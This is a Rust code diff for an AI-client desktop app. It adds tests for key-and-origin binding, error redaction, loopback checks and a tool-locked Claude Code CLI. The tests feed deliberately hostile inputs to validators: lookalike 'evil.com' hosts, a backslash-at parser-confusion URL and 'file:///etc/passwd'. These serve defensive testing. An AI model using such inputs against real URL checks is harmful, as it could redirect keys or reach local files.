+            return Err(format!("the policy {key} defines {}", what.join(" and ")));
+        }
+    }
+    Ok(())
+}
+
+#[cfg(all(unix, not(target_os = "macos")))]
+async fn scan_os_policy() -> Result<(), String> {
+    Ok(())
+}
+
+/// Refuse the CLI provider when managed policy on this machine would keep
+/// hooks or MCP servers active despite the lockdown flags (see above).
+async fn check_managed_policy() -> Result<(), String> {
+    let refuse = |why: String| {
+        format!(
+            "Hawser will not run the Claude Code CLI on this machine: managed Claude Code policy ({why}) stays active whatever flags are passed, so the CLI could run hooks or MCP servers during a request. Choose an HTTP provider (Anthropic API, OpenAI or a local model) instead."
+        )
+    };
+    let dir = managed_dir();
+    tauri::async_runtime::spawn_blocking(move || scan_managed_dir(&dir))
+        .await
+        .map_err(|e| refuse(e.to_string()))?
+        .map_err(refuse)?;
+    scan_os_policy().await.map_err(refuse)
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{is_loopback_url, same_origin};
+    use super::*;
+
+    /// In-memory vault + origins file, with failure switches.
+    #[derive(Default)]
+    struct MemStore {
+        item: Mutex<Option<String>>,
+        origin: Mutex<Option<(String, String)>>,
+        fail_write: std::sync::atomic::AtomicBool,
+        fail_origin_write: std::sync::atomic::AtomicBool,
+        origin_unreadable: std::sync::atomic::AtomicBool,
+    }
+
+    impl KeyStore for MemStore {
+        fn read(&self, slot: &str) -> Result<zeroize::Zeroizing<String>, credentials::CredError> {
+            self.item.lock().unwrap().clone().map(zeroize::Zeroizing::new).ok_or(credentials::CredError::NotFound(slot.into()))
+        }
+        fn write(&self, slot: &str, item: &str) -> Result<(), credentials::CredError> {
+            if self.fail_write.load(std::sync::atomic::Ordering::SeqCst) {
+                return Err(credentials::CredError::Malformed(slot.into()));
+            }
+            *self.item.lock().unwrap() = Some(item.into());
+            Ok(())
+        }
+        fn delete(&self, slot: &str) -> Result<(), credentials::CredError> {
+            self.item.lock().unwrap().take().map(|_| ()).ok_or(credentials::CredError::NotFound(slot.into()))
+        }
+        fn origin(&self, _: &str) -> Result<Option<(String, String)>, String> {
+            if self.origin_unreadable.load(std::sync::atomic::Ordering::SeqCst) {
+                return Err("unreadable".into());
+            }
+            Ok(self.origin.lock().unwrap().clone())
+        }
+        fn set_origin(&self, _: &str, origin: Option<&(String, String)>) -> Result<(), String> {
+            if self.fail_origin_write.load(std::sync::atomic::Ordering::SeqCst) {
+                return Err("disk full".into());
+            }
+            *self.origin.lock().unwrap() = origin.cloned();
+            Ok(())
+        }
+    }
+
+    fn origin(kind: &str, url: &str) -> Option<(String, String)> {
+        Some((kind.to_string(), url.to_string()))
+    }
+
+    /// W4d: the key's vault item holds the key and a digest of its origin;
+    /// the origin itself is in the origins file.
+    #[test]
+    fn an_ai_key_and_its_origin_round_trip() {
+        let st = MemStore::default();
+        save_key_with(&st, "default", "sk-new", "anthropic", "https://api.anthropic.com").unwrap();
+        let raw = st.item.lock().unwrap().clone().unwrap();
+        assert!(raw.starts_with("hawser-vault:2:"), "marked item");
+        assert!(!raw.contains("anthropic.com"), "the origin itself is not in the vault item");
+        assert_eq!(*st.origin.lock().unwrap(), origin("anthropic", "https://api.anthropic.com"));
+        let (key, o) = read_key(&st, "default").unwrap();
+        assert_eq!(key.as_deref().map(String::as_str), Some("sk-new"));
+        assert_eq!(o, origin("anthropic", "https://api.anthropic.com"));
+        // No key: nothing to send.
+        let empty = MemStore::default();
+        let (key, o) = read_key(&empty, "default").unwrap();
+        assert!(key.is_none() && o.is_none());
+        // Removed: key first, then its origin.
+        delete_key_with(&st, "default").unwrap();
+        assert!(st.item.lock().unwrap().is_none() && st.origin.lock().unwrap().is_none());
+        delete_key_with(&st, "default").unwrap();
+    }
+
+    #[test]
+    fn a_failed_key_write_keeps_the_previous_key_with_its_origin() {
+        let st = MemStore::default();
+        save_key_with(&st, "default", "sk-old", "openai", "https://api.openai.com/v1").unwrap();
+        st.fail_write.store(true, std::sync::atomic::Ordering::SeqCst);
+        assert!(save_key_with(&st, "default", "sk-new", "anthropic", "https://api.anthropic.com").is_err());
+        let (key, o) = read_key(&st, "default").unwrap();
+        assert_eq!(key.as_deref().map(String::as_str), Some("sk-old"));
+        assert_eq!(o, origin("openai", "https://api.openai.com/v1"), "the origin was rolled back");
+        // A failed origin write saves nothing.
+        st.fail_write.store(false, std::sync::atomic::Ordering::SeqCst);
+        st.fail_origin_write.store(true, std::sync::atomic::Ordering::SeqCst);
+        assert!(save_key_with(&st, "default", "sk-new", "anthropic", "https://api.anthropic.com").is_err());
+        assert_eq!(read_key(&st, "default").unwrap().0.as_deref().map(String::as_str), Some("sk-old"));
+    }
+
+    /// W4d: a crash between the origin write and the vault write (or a failed
+    /// rollback) leaves an origin the old key's digest does not match: the
+    /// key is refused, never sent to either provider.
+    #[test]
+    fn a_save_cut_short_between_its_writes_fails_closed() {
+        let st = MemStore::default();
+        save_key_with(&st, "default", "sk-old", "openai", "https://api.openai.com/v1").unwrap();
+        // Step 1 of a new save done, step 2 never ran.
+        *st.origin.lock().unwrap() = origin("anthropic", "https://evil.example");
+        assert!(read_key(&st, "default").is_err());
+        // An unreadable or missing origin fails closed too.
+        *st.origin.lock().unwrap() = None;
+        assert!(read_key(&st, "default").is_err());
+        *st.origin.lock().unwrap() = origin("openai", "https://api.openai.com/v1");
+        st.origin_unreadable.store(true, std::sync::atomic::Ordering::SeqCst);
+        assert!(read_key(&st, "default").is_err());
+        st.origin_unreadable.store(false, std::sync::atomic::Ordering::SeqCst);
+        assert!(read_key(&st, "default").is_ok(), "the original pair still matches");
+        // The digest is over the exact origin: a trailing slash is a different one.
+        *st.origin.lock().unwrap() = origin("openai", "https://api.openai.com/v1/");
+        assert!(read_key(&st, "default").is_err());
+        // Saving again repairs it.
+        save_key_with(&st, "default", "sk-new", "anthropic", "https://api.anthropic.com").unwrap();
+        assert_eq!(read_key(&st, "default").unwrap().1, origin("anthropic", "https://api.anthropic.com"));
+    }
+
+    /// W4d: no unmarked or host-shaped item is ever used as a key (there is
+    /// no released earlier format to read).
+    #[test]
+    fn a_plain_damaged_or_host_shaped_key_item_is_never_used() {
+        let st = MemStore::default();
+        *st.origin.lock().unwrap() = origin("openai", "https://api.openai.com/v1");
+        let host_item = format!("hawser-vault:2:{{\"user\":\"u\",\"secret\":\"k\",\"dest_digest\":\"{}\"}}", "a".repeat(64));
+        for raw in ["sk-plain-from-a-dev-build", "{\"v\":2,\"secret\":\"k\",\"origin\":[\"openai\",\"https://api.openai.com/v1\"]}", "hawser-vault:2:{", &host_item] {
+            *st.item.lock().unwrap() = Some(raw.into());
+            assert!(read_key(&st, "default").is_err(), "{raw}");
+        }
+    }
+
+    fn loopback(raw: &str) -> bool {
+        is_loopback(&parse_base_url(raw).unwrap())
+    }
 
     #[test]
     fn origin_match_ignores_only_trailing_slash() {
@@ -592,17 +1518,245 @@ mod tests {
     #[test]
     fn loopback_urls_allow_plain_http() {
         // Local providers people actually use.
-        assert!(is_loopback_url("http://localhost:11434/v1")); // Ollama
-        assert!(is_loopback_url("http://127.0.0.1:1234/v1")); // LM Studio
-        assert!(is_loopback_url("http://[::1]:8080"));
-        assert!(is_loopback_url("https://localhost"));
+        assert!(loopback("http://localhost:11434/v1")); // Ollama
+        assert!(loopback("http://127.0.0.1:1234/v1")); // LM Studio
+        assert!(loopback("http://127.0.0.2:1234/v1"));
+        assert!(loopback("http://[::1]:8080"));
+        assert!(loopback("https://LOCALHOST"));
     }
 
     #[test]
     fn remote_and_lookalike_hosts_are_not_loopback() {
-        assert!(!is_loopback_url("http://api.openai.com/v1"));
-        assert!(!is_loopback_url("http://localhost.evil.com/v1")); // the trap
-        assert!(!is_loopback_url("http://127.0.0.1.evil.com"));
-        assert!(!is_loopback_url("http://user@evil.com/localhost"));
+        assert!(!loopback("http://api.openai.com/v1"));
+        assert!(!loopback("http://localhost.evil.com/v1")); // the trap
+        assert!(!loopback("http://127.0.0.1.evil.com"));
+        assert!(!loopback("http://evil.com/localhost"));
+        // *.localhost can be resolved by DNS on some systems: not trusted.
+        assert!(!loopback("http://ollama.localhost:11434"));
+    }
+
+    #[test]
+    fn urls_that_confuse_parsers_are_rejected_outright() {
+        // Looked like localhost to the old string split; the URL parser sends
+        // it to evil.com.
+        assert!(parse_base_url("http://evil.com\\@localhost").is_err());
+        assert!(parse_base_url("http://user@localhost:11434").is_err());
+        assert!(parse_base_url("http://user:pw@evil.com").is_err());
+        assert!(parse_base_url("ftp://localhost").is_err());
+        assert!(parse_base_url("file:///etc/passwd").is_err());
+        assert!(parse_base_url("https://api.openai.com/v1?x=1").is_err());
+        assert!(parse_base_url("not a url").is_err());
+        assert!(parse_base_url(" https://api.anthropic.com ").is_ok());
+    }
+
+    #[test]
+    fn request_urls_are_built_from_the_parsed_base() {
+        let base = parse_base_url("https://api.openai.com/v1/").unwrap();
+        assert_eq!(endpoint_url(&base, "chat/completions").as_str(), "https://api.openai.com/v1/chat/completions");
+        let base = parse_base_url("https://api.anthropic.com").unwrap();
+        assert_eq!(endpoint_url(&base, "v1/messages").as_str(), "https://api.anthropic.com/v1/messages");
+    }
+
+    #[test]
+    fn provider_errors_never_echo_the_key() {
+        let key = "sk-ant-secret-123456";
+        let msg = format!("401: invalid x-api-key {key} for org");
+        assert_eq!(sanitize_error(&msg, Some(key)), "401: invalid x-api-key [redacted] for org");
+        assert_eq!(sanitize_error("plain", None), "plain");
+    }
+
+    #[test]
+    fn errors_are_scrubbed_before_they_are_cut() {
+        // The key straddles the 400-character cut: truncating first kept its
+        // first half. Use a key redact_tokens would not catch on its own.
+        let key = "abcdefghijklmnopqrstuvwxyzABCDEF";
+        let msg = format!("{}{key} tail", "x ".repeat(195));
+        let out = sanitize_error(&msg, Some(key));
+        assert!(!out.contains("abcdefgh"), "{out}");
+        // A capped read that ends inside the key loses the fragment too.
+        let cut = format!("403: bad key {}", &key[..12]);
+        assert_eq!(sanitize_error(&cut, Some(key)), "403: bad key [redacted]");
+        // Multi-byte text at the cut never panics.
+        let wide = "é".repeat(1000);
+        assert!(sanitize_error(&wide, Some(key)).chars().count() <= MAX_ERROR_CHARS + 1);
+    }
+
+    #[test]
+    fn short_keys_hide_the_provider_error_entirely() {
+        for key in ["k", "abc", "1234567"] {
+            let out = sanitize_error(&format!("401 bad key {key}"), Some(key));
+            assert!(!out.contains("bad key"), "{out}");
+        }
+        assert!(sanitize_error("401 bad key 12345678", Some("12345678")).contains("[redacted]"));
+    }
+
+    #[test]
+    fn token_like_strings_are_redacted() {
+        let out = redact_tokens("auth failed for sk-proj-AbC123dEf456GhI789 (Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEyMzR9.x)");
+        assert!(!out.contains("AbC123"), "{out}");
+        assert!(!out.contains("eyJhbGciOiJIUzI1NiJ9"), "{out}");
+        // Ordinary words and short ids survive.
+        assert_eq!(redact_tokens("model not_found: claude-x 404"), "model not_found: claude-x 404");
+    }
+
+    #[test]
+    fn cli_stderr_is_never_forwarded_raw() {
+        let stderr = "Error: invalid x-api-key sk-ant-api03-ZZZ999yyy888xxx777www\nhint\x1b[31m";
+        let out = cli_failure("exit status: 1", stderr);
+        assert!(out.starts_with("Claude CLI exited exit status: 1."), "{out}");
+        assert!(!out.contains("ZZZ999"), "{out}");
+        assert!(!out.contains('\x1b') && !out.contains('\n'), "{out}");
+        // Short or alphabetic-only secrets that no redaction heuristic would
+        // catch: no part of stderr reaches the message at all.
+        let out = cli_failure("1", "proxy rejected password hunter2 for user bob");
+        assert!(!out.contains("hunter2") && !out.contains("bob") && !out.contains("proxy"), "{out}");
+        assert!(!cli_failure("1", "secret SECRETWORD").contains("SECRETWORD"));
+        let long = "e".repeat(5000);
+        assert!(cli_failure("1", &long).chars().count() < 400);
+        assert!(cli_failure("1", "").contains("may not be logged in"));
+    }
+
+    #[test]
+    fn stop_before_the_run_registers_still_cancels_it() {
+        // Stop's ai_cancel overtook ai_chat: the run never starts.
+        let mut t = RunTable::default();
+        assert!(!t.cancel("r1"));
+        assert!(t.register("r1").is_none());
+        assert!(t.live.is_empty() && t.early.is_empty());
+        // The usual order: registered first, then a Stop reaches it.
+        let mut rx = t.register("r2").expect("not cancelled");
+        assert!(rx.try_recv().is_err());
+        assert!(t.cancel("r2"));
+        assert!(rx.try_recv().is_ok());
+        // A run that finished leaves nothing to cancel; a later run with
+        // another id is unaffected by stale early cancels.
+        let _rx3 = t.register("r3").unwrap();
+        t.finish("r3");
+        assert!(!t.cancel("r3"));
+        assert!(t.register("r4").is_some());
+        // Early cancels are bounded.
+        for i in 0..(MAX_EARLY_CANCELS * 2) {
+            t.cancel(&format!("gone-{i}"));
+        }
+        assert_eq!(t.early.len(), MAX_EARLY_CANCELS);
+    }
+
+    #[test]
+    fn loopback_requests_bypass_proxies() {
+        // reqwest exposes no getter for the proxy list, so this checks the
+        // decision that selects `no_proxy`, and that both clients build.
+        let local = parse_base_url("http://localhost:11434/v1").unwrap();
+        let remote = parse_base_url("https://api.openai.com/v1").unwrap();
+        assert!(is_loopback(&local) && !is_loopback(&remote));
+        assert!(http_client(&local).is_ok() && http_client(&remote).is_ok());
+    }
+
+    #[test]
+    fn managed_policy_with_hooks_or_mcp_blocks_the_cli() {
+        let d = std::env::temp_dir().join(format!("hawser-managed-{}", crate::utils::artifacts::random_hex(8)));
+        std::fs::create_dir_all(&d).unwrap();
+        // Nothing deployed: fine.
+        assert!(scan_managed_dir(&d).is_ok());
+        // A policy without hooks or MCP: fine.
+        std::fs::write(d.join("managed-settings.json"), r#"{"permissions":{"deny":["Bash"]},"hooks":{}}"#).unwrap();
+        assert!(scan_managed_dir(&d).is_ok());
+        // Hooks in a drop-in: refused.
+        std::fs::create_dir_all(d.join("managed-settings.d")).unwrap();
+        std::fs::write(
+            d.join("managed-settings.d/10-hooks.json"),
+            r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"x"}]}]}}"#,
+        )
+        .unwrap();
+        assert!(scan_managed_dir(&d).unwrap_err().contains("hooks"));
+        std::fs::remove_file(d.join("managed-settings.d/10-hooks.json")).unwrap();
+        // A managed MCP file with servers: refused; an empty one: fine.
+        std::fs::write(d.join("managed-mcp.json"), r#"{"mcpServers":{}}"#).unwrap();
+        assert!(scan_managed_dir(&d).is_ok());
+        std::fs::write(d.join("managed-mcp.json"), r#"{"mcpServers":{"x":{"command":"y"}}}"#).unwrap();
+        assert!(scan_managed_dir(&d).unwrap_err().contains("MCP"));
+        // Unparseable: fail closed.
+        std::fs::write(d.join("managed-mcp.json"), "{oops").unwrap();
+        assert!(scan_managed_dir(&d).is_err());
+        let _ = std::fs::remove_dir_all(&d);
+        assert_eq!(policy_blockers(&json!({"managedMcpServers":[{"name":"a"}]})), vec!["MCP servers"]);
+    }
+
+    #[test]
+    fn key_and_origin_are_read_as_one_unit() {
+        // While a save holds the binding lock, a chat's read of the pair waits
+        // for it rather than seeing the new key with the old origin.
+        let guard = binding_lock();
+        let (tx, rx) = std::sync::mpsc::channel();
+        let t = std::thread::spawn(move || {
+            let _g = binding_lock();
+            tx.send(()).unwrap();
+        });
+        assert!(rx.recv_timeout(Duration::from_millis(100)).is_err(), "reader got in during a save");
+        drop(guard);
+        assert!(rx.recv_timeout(Duration::from_secs(5)).is_ok());
+        t.join().unwrap();
+    }
+
+    #[test]
+    fn the_cli_is_locked_down_or_not_run() {
+        let help = "  --tools <tools...>  x\n  --strict-mcp-config\n  --mcp-config <c...>\n  --setting-sources <s>\n  --no-session-persistence\n  --permission-prompts <t>\n  --disallowedTools, --disallowed-tools <tools...>\n";
+        let f = parse_cli_features(help).unwrap();
+        assert!(f.no_session_persistence && f.permission_prompts && f.disallowed_tools);
+        assert!(!f.disable_slash_commands);
+
+        // An older CLI without the lockdown flags is refused, not run open.
+        let old = "  --allowedTools <tools...>\n  --mcp-config <c...>\n";
+        let missing = parse_cli_features(old).unwrap_err();
+        assert!(missing.contains(&"--tools") && missing.contains(&"--strict-mcp-config"));
+        assert!(missing.contains(&"--setting-sources"));
+        // "--tools" inside a longer name does not count.
+        assert!(!has_flag("--disallowed-tools --toolsfoo", "--tools"));
+
+        let args: Vec<String> = cli_args(&f, Path::new("/tmp/x/mcp.json"))
+            .into_iter()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect();
+        let after = |flag: &str| args.iter().position(|a| a == flag).map(|i| args[i + 1].clone());
+        assert_eq!(after("--tools").as_deref(), Some(""));
+        assert_eq!(after("--setting-sources").as_deref(), Some(""));
+        assert_eq!(after("--mcp-config").as_deref(), Some("/tmp/x/mcp.json"));
+        assert!(args.contains(&"--strict-mcp-config".to_string()));
+        assert_eq!(args.last().map(String::as_str), Some(DENY_TOOLS));
+        assert!(!args.iter().any(|a| a.contains("dangerously") || a == "--continue" || a == "--resume"));
+    }
+
+    #[test]
+    fn the_cli_sandbox_is_empty_and_cleaned_up() {
+        let s = Sandbox::new().unwrap();
+        let root = s.root.clone();
+        assert_eq!(std::fs::read_dir(s.work()).unwrap().count(), 0);
+        assert_eq!(std::fs::read_to_string(s.mcp_config()).unwrap(), r#"{"mcpServers":{}}"#);
+        drop(s);
+        assert!(!root.exists());
+    }
+
+    /// Manual check against the installed CLI (costs one tiny request):
+    /// `cargo test live_cli -- --ignored --nocapture`.
+    #[tokio::test]
+    #[ignore]
+    async fn live_cli_runs_without_tools() {
+        let out = std::sync::Mutex::new(String::new());
+        let emit = |d: String| out.lock().unwrap().push_str(&d);
+        let prompt = "Reply with exactly TOOLS: followed by the names of the tools you can call, or NONE.".to_string();
+        run_cli(&emit, prompt).await.unwrap();
+        let text = out.into_inner().unwrap();
+        println!("{text}");
+        assert!(text.contains("NONE"), "{text}");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn well_known_dirs_cover_gui_launches() {
+        let dirs = well_known_dirs(Some(Path::new("/Users/x")));
+        for want in ["/Users/x/.local/bin", "/opt/homebrew/bin", "/usr/local/bin"] {
+            assert!(dirs.contains(&PathBuf::from(want)), "missing {want}");
+        }
+        let p = child_path(Path::new("/Users/x/.local/bin/claude"));
+        assert_eq!(std::env::split_paths(&p).next(), Some(PathBuf::from("/Users/x/.local/bin")));
     }
 }
